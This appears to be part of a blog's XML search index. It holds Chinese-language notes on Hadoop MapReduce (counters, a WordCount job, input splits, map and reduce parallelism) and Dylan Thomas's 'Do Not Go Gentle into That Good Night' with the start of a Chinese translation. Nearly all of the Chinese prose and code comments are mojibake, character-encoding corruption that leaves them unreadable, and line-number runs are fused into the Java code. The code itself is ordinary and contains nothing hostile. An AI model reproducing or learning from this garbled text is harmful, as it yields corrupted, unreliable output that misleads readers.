å®šä¹‰æšä¸¾ç±» 1234enum Temperature&#123; MISSING, TOTAL &#125; åœ¨mapæˆ–è€…reduceä¸­ä½¿ç”¨è®¡æ•°å™¨ 123456// 1.è‡ªå®šä¹‰è®¡æ•°å™¨Counter counter = context.getCounter(Temperature.TOTAL); // 2.ä¸ºè®¡æ•°å™¨èµ‹åˆå§‹å€¼counter.setValue(long value);// 3.è®¡æ•°å™¨å·¥ä½œcounter.increment(long incr); è·å–è®¡æ•°å™¨ 123Counters counters=job.getCounters(); Counter counter=counters.findCounter(LOG_PROCESSOR_COUNTER.BAD_RECORDS_LONG);// æŸ¥æ‰¾æšä¸¾è®¡æ•°å™¨ï¼Œå‡å¦‚Enumçš„å˜é‡ä¸ºBAD_RECORDS_LONG long value=counter.getValue();//è·å–è®¡æ•°å€¼ è®¡æ•°å™¨ä½¿ç”¨å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * @Description å‡å¦‚ä¸€ä¸ªæ–‡ä»¶ï¼Œè§„èŒƒçš„æ ¼å¼æ˜¯3ä¸ªå­—æ®µï¼Œâ€œ\tâ€ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå…¶ä¸­æœ‰2æ¡å¼‚å¸¸æ•°æ®ï¼Œä¸€æ¡æ•°æ®æ˜¯åªæœ‰2ä¸ªå­—æ®µï¼Œä¸€æ¡æ•°æ®æ˜¯æœ‰4ä¸ªå­—æ®µ*/public class MyCounter &#123; // \té”® private static String TAB_SEPARATOR = "\t"; public static class MyCounterMap extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; // å®šä¹‰æšä¸¾å¯¹è±¡ public static enum LOG_PROCESSOR_COUNTER &#123; BAD_RECORDS_LONG, BAD_RECORDS_SHORT &#125;; protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String arr_value[] = value.toString().split(TAB_SEPARATOR); if (arr_value.length &gt; 3) &#123; /* è‡ªå®šä¹‰è®¡æ•°å™¨ */ context.getCounter("ErrorCounter", "toolong").increment(1); /* æšä¸¾è®¡æ•°å™¨ */ context.getCounter(LOG_PROCESSOR_COUNTER.BAD_RECORDS_LONG).increment(1); &#125; else if (arr_value.length &lt; 3) &#123; // è‡ªå®šä¹‰è®¡æ•°å™¨ context.getCounter("ErrorCounter", "tooshort").increment(1); // æšä¸¾è®¡æ•°å™¨ context.getCounter(LOG_PROCESSOR_COUNTER.BAD_RECORDS_SHORT).increment(1); &#125; &#125; &#125; @SuppressWarnings("deprecation") public static void main(String[] args) throws IOException, InterruptedException, ClassNotFoundException &#123; String[] args0 = &#123; "hdfs://hadoop2:9000/buaa/counter/counter.txt", "hdfs://hadoop2:9000/buaa/counter/out/" &#125;; // è¯»å–é…ç½®æ–‡ä»¶ Configuration conf = new Configuration(); // å¦‚æœè¾“å‡ºç›®å½•å­˜åœ¨ï¼Œåˆ™åˆ é™¤ Path mypath = new Path(args0[1]); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; // æ–°å»ºä¸€ä¸ªä»»åŠ¡ Job job = new Job(conf, "MyCounter"); // ä¸»ç±» job.setJarByClass(MyCounter.class); // Mapper job.setMapperClass(MyCounterMap.class); // è¾“å…¥ç›®å½• FileInputFormat.addInputPath(job, new Path(args0[0])); // è¾“å‡ºç›®å½• FileOutputFormat.setOutputPath(job, new Path(args0[1])); // æäº¤ä»»åŠ¡ï¼Œå¹¶é€€å‡º System.exit(job.waitForCompletion(true) ? 0 : 1); &#125;&#125; æ³¨æ„ç‚¹ï¼šåœ¨æ²¡æœ‰ ReduceTask çš„æ—¶å€™ï¼Œ job.setNumReduceTasks(0); å…³äºè®¡æ•°å™¨ï¼Œè¯¦æƒ…å¯å‚è€ƒ]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduceç¬”è®°-1 WordCount, MapReduceè¿è¡Œæœºåˆ¶]]></title>
    <url>%2F2018%2F06%2F06%2FHadoop%2F2-MapReduce%2FMapReduce%E7%AC%94%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[å‚è€ƒé“¾æ¥: hdfs ç¬”è®° mapreduce ç¬”è®° 1ã€MapReduce å…¥é—¨1.1ã€MapReduceæ¦‚å¿µhadoop çš„å››å¤§ç»„ä»¶ï¼š HDFSï¼šåˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ MapReduceï¼šåˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿ YARNï¼šhadoop çš„èµ„æºè°ƒåº¦ç³»ç»Ÿ Commonï¼šä»¥ä¸Šä¸‰å¤§ç»„ä»¶çš„åº•å±‚æ”¯æ’‘ç»„ä»¶ï¼Œä¸»è¦æä¾›åŸºç¡€å·¥å…·åŒ…å’Œ RPC æ¡†æ¶ç­‰ MapReduce æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼è¿ç®—ç¨‹åºçš„ç¼–ç¨‹æ¡†æ¶ï¼Œæ˜¯ç”¨æˆ·å¼€å‘â€œåŸºäº Hadoop çš„æ•°æ®åˆ†æåº”ç”¨â€ çš„æ ¸å¿ƒæ¡†æ¶ MapReduce æ ¸å¿ƒåŠŸèƒ½ ï¼šå°†ç”¨æˆ·ç¼–å†™çš„ä¸šåŠ¡é€»è¾‘ä»£ç å’Œè‡ªå¸¦é»˜è®¤ç»„ä»¶æ•´åˆæˆä¸€ä¸ªå®Œæ•´çš„åˆ†å¸ƒ å¼è¿ç®—ç¨‹åºï¼Œå¹¶å‘è¿è¡Œåœ¨ä¸€ä¸ª Hadoop é›†ç¾¤ä¸Š 1.2ã€ä¸ºä»€ä¹ˆéœ€è¦ MapReduceï¼Ÿå¼•å…¥ MapReduce æ¡†æ¶åï¼Œå¼€å‘äººå‘˜å¯ä»¥å°†ç»å¤§éƒ¨åˆ†å·¥ä½œé›†ä¸­åœ¨ä¸šåŠ¡é€»è¾‘çš„å¼€å‘ä¸Šï¼Œè€Œå°† åˆ†å¸ƒå¼è®¡ç®—ä¸­çš„å¤æ‚æ€§äº¤ç”±æ¡†æ¶æ¥å¤„ç† Hadoop å½“ä¸­çš„ MapReduce åˆ†å¸ƒå¼ç¨‹åºè¿ç®—æ¡†æ¶çš„æ•´ä½“ç»“æ„å¦‚ä¸‹ï¼š MRAppMasterï¼šMapReduce Application Masterï¼Œåˆ†é…ä»»åŠ¡ï¼Œåè°ƒä»»åŠ¡çš„è¿è¡Œ MapTaskï¼šé˜¶æ®µå¹¶å‘ä»»ï¼Œè´Ÿè´£ mapper é˜¶æ®µçš„ä»»åŠ¡å¤„ç† YARNChild ReduceTaskï¼šé˜¶æ®µæ±‡æ€»ä»»åŠ¡ï¼Œè´Ÿè´£ reducer é˜¶æ®µçš„ä»»åŠ¡å¤„ç† YARNChild 1.3ã€MapReduce çš„ç¼–å†™è§„èŒƒMapReduce ç¨‹åºç¼–å†™è§„èŒƒï¼š ç”¨æˆ·ç¼–å†™çš„ç¨‹åºåˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼šMapperï¼ŒReducerï¼ŒDriver(æäº¤è¿è¡Œ MR ç¨‹åºçš„å®¢æˆ·ç«¯) Mapper çš„è¾“å…¥æ•°æ®æ˜¯ KV å¯¹çš„å½¢å¼ï¼ˆKV çš„ç±»å‹å¯è‡ªå®šä¹‰ï¼‰ Mapper çš„è¾“å‡ºæ•°æ®æ˜¯ KV å¯¹çš„å½¢å¼ï¼ˆKV çš„ç±»å‹å¯è‡ªå®šä¹‰ï¼‰ Mapper ä¸­çš„ä¸šåŠ¡é€»è¾‘å†™åœ¨ map()æ–¹æ³•ä¸­ map()æ–¹æ³•ï¼ˆmaptask è¿›ç¨‹ï¼‰å¯¹æ¯ä¸€ä¸ª&lt;K,V&gt;è°ƒç”¨ä¸€æ¬¡ Reducer çš„è¾“å…¥æ•°æ®ç±»å‹å¯¹åº” Mapper çš„è¾“å‡ºæ•°æ®ç±»å‹ï¼Œä¹Ÿæ˜¯ KV å¯¹çš„å½¢å¼ Reducer çš„ä¸šåŠ¡é€»è¾‘å†™åœ¨ reduce()æ–¹æ³•ä¸­ Reducetask è¿›ç¨‹å¯¹æ¯ä¸€ç»„ç›¸åŒ k çš„&lt;K,V&gt;ç»„è°ƒç”¨ä¸€æ¬¡ reduce()æ–¹æ³• ç”¨æˆ·è‡ªå®šä¹‰çš„ Mapper å’Œ Reducer éƒ½è¦ç»§æ‰¿å„è‡ªçš„çˆ¶ç±» æ•´ä¸ªç¨‹åºéœ€è¦ä¸€ä¸ª Drvier æ¥è¿›è¡Œæäº¤ï¼Œæäº¤çš„æ˜¯ä¸€ä¸ªæè¿°äº†å„ç§å¿…è¦ä¿¡æ¯çš„ job å¯¹è±¡ 1.4ã€WordCount ç¨‹åº1ã€ä¸šåŠ¡é€»è¾‘ maptaské˜¶æ®µå¤„ç†æ¯ä¸ªæ•°æ®åˆ†å—çš„å•è¯ç»Ÿè®¡åˆ†æï¼Œæ€è·¯æ˜¯æ¯é‡åˆ°ä¸€ä¸ªå•è¯åˆ™æŠŠå…¶è½¬æ¢æˆä¸€ä¸ª key-valueå¯¹ï¼Œæ¯”å¦‚å•è¯ helloï¼Œå°±è½¬æ¢æˆ&lt;â€™helloâ€™,1&gt;å‘é€ç»™ reducetaskå»æ±‡æ€» reducetaské˜¶æ®µå°†æ¥å— maptaskçš„ç»“æœï¼Œæ¥åšæ±‡æ€»è®¡æ•° 2ã€å…·ä½“ä»£ç å®ç°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465ï£¿ï£¿ï£¿ï£¿ Map ï£¿ï£¿ï£¿ï£¿static class WordCountMapper extends Mapper&lt;LongWritable, Text, Text, IntWritable&gt; &#123; @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; // è®¡ç®—ä»»åŠ¡ä»£ç ï¼šåˆ‡å‰²å•è¯ï¼Œè¾“å‡ºæ¯ä¸ªå•è¯è®¡ 1 çš„ key-value å¯¹ String[] words = value.toString().split(" "); for (String word : words) &#123; context.write(new Text(word), new IntWritable(1)); &#125; &#125;&#125;ï£¿ï£¿ï£¿ï£¿ Reduce ï£¿ï£¿ï£¿ï£¿static class WordCountReducer extends Reducer&lt;Text, IntWritable, Text, IntWritable&gt; &#123; @Override protected void reduce(Text key, Iterable&lt;IntWritable&gt; values, Context context) throws IOException, InterruptedException &#123; // æ±‡æ€»è®¡ç®—ä»£ç ï¼šå¯¹æ¯ä¸ª key ç›¸åŒçš„ä¸€ç»„ key-value åšæ±‡æ€»ç»Ÿè®¡ int sum = 0; for (IntWritable v : values) &#123; sum += v.get(); &#125; context.write(key, new IntWritable(sum)); &#125;&#125;ï£¿ï£¿ï£¿ï£¿ main ï£¿ï£¿ï£¿ï£¿public static void main(String[] args) throws Exception &#123; // æŒ‡å®š hdfs ç›¸å…³çš„å‚æ•° Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://hadoop02:9000"); System.setProperty("HADOOP_USER_NAME", "hadoop"); // æ–°å»ºä¸€ä¸ª job ä»»åŠ¡ Job job = Job.getInstance(conf); // è®¾ç½® jar åŒ…æ‰€åœ¨è·¯å¾„ job.setJarByClass(WordCountMR.class); // æŒ‡å®š mapper ç±»å’Œ reducer ç±» job.setMapperClass(WordCountMapper.class); job.setReducerClass(WordCountReducer.class); // æŒ‡å®š maptask çš„è¾“å‡ºç±»å‹ job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(IntWritable.class); // æŒ‡å®š reducetask çš„è¾“å‡ºç±»å‹ job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); // æŒ‡å®šè¯¥ mapreduce ç¨‹åºæ•°æ®çš„è¾“å…¥å’Œè¾“å‡ºè·¯å¾„ Path inputPath = new Path("/wordcount/input"); Path outputPath = new Path("/wordcount/output"); FileInputFormat.setInputPaths(job, inputPath); FileOutputFormat.setOutputPath(job, outputPath); // æœ€åæäº¤ä»»åŠ¡ boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion?0:1);&#125; 1.5 å°æ–‡ä»¶ä¼˜åŒ– éœ€è¦è®¾ç½®æœ€å¤§å€¼å’Œæœ€å°å€¼, ä¼šåˆ‡åˆ†æ–‡ä»¶, åœ¨æœ€å¤§å€¼ä¸æœ€å°å€¼ä¹‹é—´ 2ã€MapReduce ç¨‹åºçš„æ ¸å¿ƒè¿è¡Œæœºåˆ¶2.1ã€æ¦‚è¿°ä¸€ä¸ªå®Œæ•´çš„ MapReduce ç¨‹åºåœ¨åˆ†å¸ƒå¼è¿è¡Œæ—¶æœ‰ä¸¤ç±»å®ä¾‹è¿›ç¨‹ï¼š MRAppMasterï¼šè´Ÿè´£æ•´ä¸ªç¨‹åºçš„è¿‡ç¨‹è°ƒåº¦åŠçŠ¶æ€åè°ƒ Yarnchildï¼šè´Ÿè´£ map é˜¶æ®µçš„æ•´ä¸ªæ•°æ®å¤„ç†æµç¨‹ Yarnchildï¼šè´Ÿè´£ reduce é˜¶æ®µçš„æ•´ä¸ªæ•°æ®å¤„ç†æµç¨‹ ä»¥ä¸Šä¸¤ä¸ªé˜¶æ®µ MapTask å’Œ ReduceTask çš„è¿›ç¨‹éƒ½æ˜¯ YarnChild ï¼Œ å¹¶ä¸æ˜¯è¯´è¿™ MapTask å’Œ ReduceTask å°±è·‘åœ¨åŒä¸€ä¸ª YarnChild è¿›è¡Œé‡Œ 2.2ã€MapReduce ç¨‹åºçš„è¿è¡Œæµç¨‹ ä¸€ä¸ª mr ç¨‹åºå¯åŠ¨çš„æ—¶å€™ï¼Œæœ€å…ˆå¯åŠ¨çš„æ˜¯ MRAppMasterï¼ŒMRAppMaster å¯åŠ¨åæ ¹æ®æœ¬æ¬¡ job çš„æè¿°ä¿¡æ¯ï¼Œè®¡ç®—å‡ºéœ€è¦çš„ maptask å®ä¾‹æ•°é‡ï¼Œç„¶åå‘é›†ç¾¤ç”³è¯·æœºå™¨å¯åŠ¨ç›¸åº”æ•°é‡çš„ maptask è¿›ç¨‹ maptask è¿›ç¨‹å¯åŠ¨ä¹‹åï¼Œæ ¹æ®ç»™å®šçš„æ•°æ®åˆ‡ç‰‡(å“ªä¸ªæ–‡ä»¶çš„å“ªä¸ªåç§»é‡èŒƒå›´)èŒƒå›´è¿›è¡Œæ•° æ®å¤„ç†ï¼Œä¸»ä½“æµç¨‹ä¸ºï¼š åˆ©ç”¨å®¢æˆ·æŒ‡å®šçš„ InputFormat æ¥è·å– RecordReader è¯»å–æ•°æ®ï¼Œå½¢æˆè¾“å…¥ KV å¯¹ å°†è¾“å…¥ KV å¯¹ä¼ é€’ç»™å®¢æˆ·å®šä¹‰çš„ map()æ–¹æ³•ï¼Œåšé€»è¾‘è¿ç®—ï¼Œå¹¶å°† map()æ–¹æ³•è¾“å‡ºçš„ KV å¯¹æ”¶ é›†åˆ°ç¼“å­˜ å°†ç¼“å­˜ä¸­çš„ KV å¯¹æŒ‰ç…§ K åˆ†åŒºæ’åºåä¸æ–­æº¢å†™åˆ°ç£ç›˜æ–‡ä»¶ MRAppMaster ç›‘æ§åˆ°æ‰€æœ‰ maptask è¿›ç¨‹ä»»åŠ¡å®Œæˆä¹‹åï¼ˆçœŸå®æƒ…å†µæ˜¯ï¼ŒæŸäº› maptask è¿› ç¨‹å¤„ç†å®Œæˆåï¼Œå°±ä¼šå¼€å§‹å¯åŠ¨ reducetask å»å·²å®Œæˆçš„ maptask å¤„ fetch æ•°æ®ï¼‰ï¼Œä¼šæ ¹æ®å®¢æˆ·æŒ‡ å®šçš„å‚æ•°å¯åŠ¨ç›¸åº”æ•°é‡çš„ reducetask è¿›ç¨‹ï¼Œå¹¶å‘ŠçŸ¥ reducetask è¿›ç¨‹è¦å¤„ç†çš„æ•°æ®èŒƒå›´ï¼ˆæ•°æ® åˆ†åŒºï¼‰ Reducetask è¿›ç¨‹å¯åŠ¨ä¹‹åï¼Œæ ¹æ® MRAppMaster å‘ŠçŸ¥çš„å¾…å¤„ç†æ•°æ®æ‰€åœ¨ä½ç½®ï¼Œä»è‹¥å¹²å° maptask è¿è¡Œæ‰€åœ¨æœºå™¨ä¸Šè·å–åˆ°è‹¥å¹²ä¸ª maptask è¾“å‡ºç»“æœæ–‡ä»¶ï¼Œå¹¶åœ¨æœ¬åœ°è¿›è¡Œé‡æ–°å½’å¹¶æ’åºï¼Œ ç„¶åæŒ‰ç…§ç›¸åŒ key çš„ KV ä¸ºä¸€ä¸ªç»„ï¼Œè°ƒç”¨å®¢æˆ·å®šä¹‰çš„ reduce()æ–¹æ³•è¿›è¡Œé€»è¾‘è¿ç®—ï¼Œå¹¶æ”¶é›†è¿ ç®—è¾“å‡ºçš„ç»“æœ KVï¼Œç„¶åè°ƒç”¨å®¢æˆ·æŒ‡å®šçš„ OutputFormat å°†ç»“æœæ•°æ®è¾“å‡ºåˆ°å¤–éƒ¨å­˜å‚¨ 2.3ã€MapTask å¹¶è¡Œåº¦å†³å®šæœºåˆ¶å°†å¾…å¤„ç†æ•°æ®æ‰§è¡Œé€»è¾‘åˆ‡ç‰‡ï¼ˆå³æŒ‰ç…§ä¸€ä¸ªç‰¹å®šåˆ‡ç‰‡å¤§å°ï¼Œå°†å¾…å¤„ç†æ•°æ®åˆ’åˆ†æˆé€»è¾‘ä¸Šçš„å¤š ä¸ª splitï¼‰ï¼Œç„¶åæ¯ä¸€ä¸ª split åˆ†é…ä¸€ä¸ª mapTask å¹¶è¡Œå®ä¾‹å¤„ç†ã€‚ è¿™æ®µé€»è¾‘åŠå½¢æˆçš„åˆ‡ç‰‡è§„åˆ’æè¿°æ–‡ä»¶ï¼Œæ˜¯ç”± FileInputFormat å®ç°ç±»çš„ getSplits()æ–¹æ³•å®Œæˆçš„ã€‚ è¯¥æ–¹æ³•è¿”å›çš„æ˜¯ Listï¼ŒInputSplit å°è£…äº†æ¯ä¸€ä¸ªé€»è¾‘åˆ‡ç‰‡çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬é•¿åº¦å’Œä½ç½® ä¿¡æ¯ï¼Œè€Œ getSplits()æ–¹æ³•è¿”å›ä¸€ç»„ InputSplitã€‚ 2.4ã€åˆ‡ç‰‡æœºåˆ¶ FileInputFormat ä¸­é»˜è®¤çš„åˆ‡ç‰‡æœºåˆ¶ ç®€å•åœ°æŒ‰ç…§æ–‡ä»¶çš„å†…å®¹é•¿åº¦è¿›è¡Œåˆ‡ç‰‡ åˆ‡ç‰‡å¤§å°ï¼Œé»˜è®¤ç­‰äº block å¤§å° åˆ‡ç‰‡æ—¶ä¸è€ƒè™‘æ•°æ®é›†æ•´ä½“ï¼Œè€Œæ˜¯é€ä¸ªé’ˆå¯¹æ¯ä¸€ä¸ªæ–‡ä»¶å•ç‹¬åˆ‡ç‰‡ æ¯”å¦‚å¾…å¤„ç†æ•°æ®æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼š File1.txt 200M File2.txt 100M ç»è¿‡ getSplits()æ–¹æ³•å¤„ç†ä¹‹åï¼Œå½¢æˆçš„åˆ‡ç‰‡ä¿¡æ¯æ˜¯ï¼š File1.txt-split1 0-128M File1.txt-split2 129M-200M File2.txt-split1 0-100M FileInputFormat ä¸­åˆ‡ç‰‡çš„å¤§å°çš„å‚æ•°é…ç½®1234567891011// é€šè¿‡åˆ†ææºç ï¼Œåœ¨ FileInputFormat ä¸­ï¼Œè®¡ç®—åˆ‡ç‰‡å¤§å°çš„é€»è¾‘ï¼šlong splitSize = computeSplitSize(blockSize, minSize, maxSize)ï¼Œç¿»è¯‘ä¸€ä¸‹å°±æ˜¯æ±‚è¿™ä¸‰ä¸ªå€¼çš„ä¸­ é—´å€¼// åˆ‡ç‰‡ä¸»è¦ç”±è¿™å‡ ä¸ªå€¼æ¥è¿ç®—å†³å®šï¼šblocksizeï¼šé»˜è®¤æ˜¯ 128Mï¼Œå¯é€šè¿‡ dfs.blocksize ä¿®æ”¹minSizeï¼šé»˜è®¤æ˜¯ 1ï¼Œå¯é€šè¿‡ mapreduce.input.fileinputformat.split.minsize ä¿®æ”¹maxsizeï¼šé»˜è®¤æ˜¯ Long.MaxValueï¼Œå¯é€šè¿‡ mapreduce.input.fileinputformat.split.maxsize ä¿®æ”¹//å› æ­¤ï¼Œå¦‚æœ maxsize è°ƒçš„æ¯” blocksize å°ï¼Œåˆ™åˆ‡ç‰‡ä¼šå°äº blocksize; å¦‚æœ minsize è°ƒçš„æ¯” blocksize å¤§ï¼Œåˆ™åˆ‡ç‰‡ä¼šå¤§äº blocksize// ä½†æ˜¯ï¼Œä¸è®ºæ€ä¹ˆè°ƒå‚æ•°ï¼Œéƒ½ä¸èƒ½è®©å¤šä¸ªå°æ–‡ä»¶â€œåˆ’å…¥â€ä¸€ä¸ª split 2.5ã€MapTask å¹¶è¡Œåº¦ç»éªŒä¹‹è°ˆå¦‚æœç¡¬ä»¶é…ç½®ä¸º 2*12core + 64Gï¼Œæ°å½“çš„ map å¹¶è¡Œåº¦æ˜¯å¤§çº¦æ¯ä¸ªèŠ‚ç‚¹ 20-100 ä¸ª mapï¼Œæœ€å¥½ æ¯ä¸ª map çš„æ‰§è¡Œæ—¶é—´è‡³å°‘ä¸€åˆ†é’Ÿã€‚ å¦‚æœ job çš„æ¯ä¸ª map æˆ–è€… reduce task çš„è¿è¡Œæ—¶é—´éƒ½åªæœ‰ 30-40 ç§’é’Ÿï¼Œé‚£ä¹ˆå°±å‡å°‘è¯¥ job çš„ map æˆ–è€… reduce æ•°ï¼Œæ¯ä¸€ä¸ª task(map|reduce)çš„ setup å’ŒåŠ å…¥åˆ°è°ƒåº¦å™¨ä¸­è¿›è¡Œè°ƒåº¦ï¼Œè¿™ä¸ª ä¸­é—´çš„è¿‡ç¨‹å¯èƒ½éƒ½è¦èŠ±è´¹å‡ ç§’é’Ÿï¼Œæ‰€ä»¥å¦‚æœæ¯ä¸ª task éƒ½éå¸¸å¿«å°±è·‘å®Œäº†ï¼Œå°±ä¼šåœ¨ task çš„å¼€ å§‹å’Œç»“æŸçš„æ—¶å€™æµªè´¹å¤ªå¤šçš„æ—¶é—´ã€‚ é…ç½® task çš„ JVM é‡ç”¨å¯ä»¥æ”¹å–„è¯¥é—®é¢˜ï¼š mapred.job.reuse.jvm.num.tasksï¼Œé»˜è®¤æ˜¯ 1ï¼Œè¡¨ç¤ºä¸€ä¸ª JVM ä¸Šæœ€å¤šå¯ä»¥é¡ºåºæ‰§è¡Œçš„ task æ•°ç›®ï¼ˆå±äºåŒä¸€ä¸ª Jobï¼‰æ˜¯ 1ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ª task å¯ä¸€ä¸ª JVMã€‚ è¿™ä¸ªå€¼å¯ä»¥åœ¨ mapred-site.xml ä¸­è¿›è¡Œæ›´æ”¹ï¼Œå½“è®¾ç½®æˆå¤šä¸ªï¼Œå°±æ„å‘³ç€è¿™å¤šä¸ª task è¿è¡Œåœ¨åŒä¸€ä¸ª JVM ä¸Šï¼Œä½†ä¸æ˜¯åŒæ—¶æ‰§è¡Œï¼Œ æ˜¯æ’é˜Ÿé¡ºåºæ‰§è¡Œ å¦‚æœ input çš„æ–‡ä»¶éå¸¸çš„å¤§ï¼Œæ¯”å¦‚ 1TBï¼Œå¯ä»¥è€ƒè™‘å°† hdfs ä¸Šçš„æ¯ä¸ª blocksize è®¾å¤§ï¼Œæ¯”å¦‚ è®¾æˆ 256MB æˆ–è€… 512MB 2.6ã€ReduceTask å¹¶è¡Œåº¦å†³å®šæœºåˆ¶reducetask çš„å¹¶è¡Œåº¦åŒæ ·å½±å“æ•´ä¸ª job çš„æ‰§è¡Œå¹¶å‘åº¦å’Œæ‰§è¡Œæ•ˆç‡ï¼Œä½†ä¸ maptask çš„å¹¶å‘æ•°ç”± åˆ‡ç‰‡æ•°å†³å®šä¸åŒï¼ŒReducetask æ•°é‡çš„å†³å®šæ˜¯å¯ä»¥ç›´æ¥æ‰‹åŠ¨è®¾ç½®ï¼š 12// è®¾ç½® ReduceTask çš„å¹¶è¡Œåº¦job.setNumReduceTasks(4); é»˜è®¤å€¼æ˜¯ 1ï¼Œ æ‰‹åŠ¨è®¾ç½®ä¸º 4ï¼Œè¡¨ç¤ºè¿è¡Œ 4 ä¸ª reduceTaskï¼Œ è®¾ç½®ä¸º 0ï¼Œè¡¨ç¤ºä¸è¿è¡Œ reduceTask ä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰ reducer é˜¶æ®µï¼Œåªæœ‰ mapper é˜¶æ®µ å¦‚æœæ•°æ®åˆ†å¸ƒä¸å‡åŒ€ï¼Œå°±æœ‰å¯èƒ½åœ¨ reduce é˜¶æ®µäº§ç”Ÿæ•°æ®å€¾æ–œ æ³¨æ„ï¼šreducetask æ•°é‡å¹¶ä¸æ˜¯ä»»æ„è®¾ç½®ï¼Œè¿˜è¦è€ƒè™‘ä¸šåŠ¡é€»è¾‘éœ€æ±‚ï¼Œæœ‰äº›æƒ…å†µä¸‹ï¼Œéœ€è¦è®¡ç®—å…¨å±€æ±‡æ€»ç»“æœï¼Œå°±åªèƒ½æœ‰ 1 ä¸ª reducetask å°½é‡ä¸è¦è¿è¡Œå¤ªå¤šçš„ reducetaskã€‚å¯¹å¤§å¤šæ•° job æ¥è¯´ï¼Œæœ€å¥½ rduce çš„ä¸ªæ•°æœ€å¤šå’Œé›†ç¾¤ä¸­çš„ reduce æŒå¹³ï¼Œæˆ–è€…æ¯”é›†ç¾¤çš„ reduce slots å°ã€‚è¿™ä¸ªå¯¹äºå°é›†ç¾¤è€Œè¨€ï¼Œå°¤å…¶é‡è¦ã€‚ æœ€å¥½çš„ReduceTask ä¸ªæ•°æ˜¯ï¼šdatanode ä¸ªæ•° * 0.75~0.95 å·¦å³ 2.7 å®¢æˆ·ç«¯æäº¤ MR ç¨‹åº Job çš„æµç¨‹ 3. æ˜¨æ—¥å¤ä¹ 1.MapReduce çš„ wc ç¼–ç¨‹ æ‰‹å†™ä»£ç  Mapper Reducer Driver 2.MapTask çš„å¹¶è¡Œåº¦ åœ¨ç¨‹åºæ‰§è¡Œçš„æ—¶å€™è¿è¡Œçš„ maptask çš„æ€»ä¸ªæ•° 3.ReduceTaskçš„å¹¶è¡Œåº¦é—®é¢˜ ReduceTask çš„å¹¶è¡Œåº¦è®¾ç½®ä¾èµ–äºè‡ªå·±ä¼ å…¥çš„å‚æ•° ä¸€èˆ¬ç»éªŒï¼š ReduceTask çš„ä¸ªæ•°åº”è¯¥ = datanode çš„é˜¶æ®µæ•° * ï¼ˆ0.75~0.95ï¼‰ ReduceTask åœ¨è®¾ç½®çš„æ—¶å€™çš„å¹¶è¡Œåº¦æœ‰ä¸€å®šçš„ç“¶é¢ˆ åˆ†åŒºï¼š å†³å®š ReduceTask ä¸­çš„æ•°æ®æ€ä¹ˆåˆ†é…çš„ é»˜è®¤åˆ†åŒºæ–¹å¼ è‡ªå®šä¹‰åˆ†åŒº]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[â–Do Not Go Gentle into That Good Night]]></title>
    <url>%2F2018%2F06%2F04%2FPoetry%2F%E4%B8%8D%E8%A6%81%E6%B8%A9%E5%92%8C%E7%9A%84%E8%B5%B0%E8%BF%9B%E9%82%A3%E4%B8%AA%E8%89%AF%E5%A4%9C%2F</url>
    <content type="text"><![CDATA[Do not go gentle into that good night, Old age should burn and rave at close of the day; Rage, rage against the dying of the light. Though wise men at their end know dark is right, Because their words had forked no lightning they Do not go gentle into that good night. Good men, the last wave by, crying how bright Their frail deeds might have danced in a green bay, Rage, rage against the dying of the light. Wild men, who caught and sang the sun in flight, And learn, too late, they grieved it on its way, Do not go gentle into that good night. Grave men, near death, who see with blinding sight Blind eyes could blaze like meteors and be gay, Rage, rage against the dying of the light. And you, my father, there on the sad height, Curse, bless, me now with your fierce tears, I pray. Do not go gentle into that good night. Rage, rage against the dying of the light. ã€Šä¸è¦æ¸©å’Œåœ°èµ°è¿›é‚£ä¸ªè‰¯å¤œã€‹ -å·«å®å¤è¯‘æœ¬ â€‹ ä¸è¦æ¸©å’Œåœ°èµ°è¿›é‚£ä¸ªè‰¯å¤œï¼Œ è€å¹´åº”å½“åœ¨æ—¥æš®æ—¶ç‡ƒçƒ§å’†å“®ï¼› æ€’æ–¥ï¼Œæ€’æ–¥å…‰æ˜çš„æ¶ˆé€ã€‚ è™½ç„¶æ™ºæ…§çš„äººä¸´ç»ˆæ—¶æ‡‚å¾—é»‘æš—æœ‰ç†ï¼Œ å› ä¸ºä»–ä»¬çš„è¯æ²¡æœ‰è¿›å‘å‡ºé—ªç”µï¼Œä»–ä»¬ ä¹Ÿå¹¶ä¸æ¸©å’Œåœ°èµ°è¿›é‚£ä¸ªè‰¯å¤œã€‚ å–„è‰¯çš„äººï¼Œå½“æœ€åä¸€æµªè¿‡å»ï¼Œé«˜å‘¼ä»–ä»¬è„†å¼±çš„å–„è¡Œ å¯èƒ½æ›¾ä¼šå¤šä¹ˆå…‰è¾‰åœ°åœ¨ç»¿è‰²çš„æµ·æ¹¾é‡Œèˆè¹ˆï¼Œ æ€’æ–¥ï¼Œæ€’æ–¥å…‰æ˜çš„æ¶ˆé€ã€‚ 